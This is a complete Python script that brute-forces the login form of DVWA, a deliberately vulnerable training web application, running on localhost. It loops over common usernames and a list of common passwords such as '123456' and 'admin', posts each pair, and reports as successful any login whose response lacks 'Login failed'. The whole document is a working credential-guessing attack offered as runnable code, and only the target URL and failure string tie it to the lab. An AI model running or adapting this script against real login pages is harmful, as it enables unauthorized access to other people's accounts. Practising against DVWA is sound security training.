import requests

# Configuration
base_url = "http://127.0.0.1/DVWA/"
login_url = base_url + "login.php"

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# List of common passwords to try
passwords = ["123456", "password", "admin", "admin123", "letmein"]

def brute_force(username):
    for password in passwords:
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        response = requests.post(login_url, headers=headers, data=data)
        if "Login failed" not in response.text:
            print(f"Successful login with username: {username} and password: {password}")
            break
        else:
            print(f"Failed login with username: {username} and password: {password}")

def main():
    # Testing for common usernames
    usernames = ["admin", "user", "test", "guest"]
    for username in usernames:
        print(f"Testing username: {username}")
        brute_force(username)

if __name__ == "__main__":
    main()
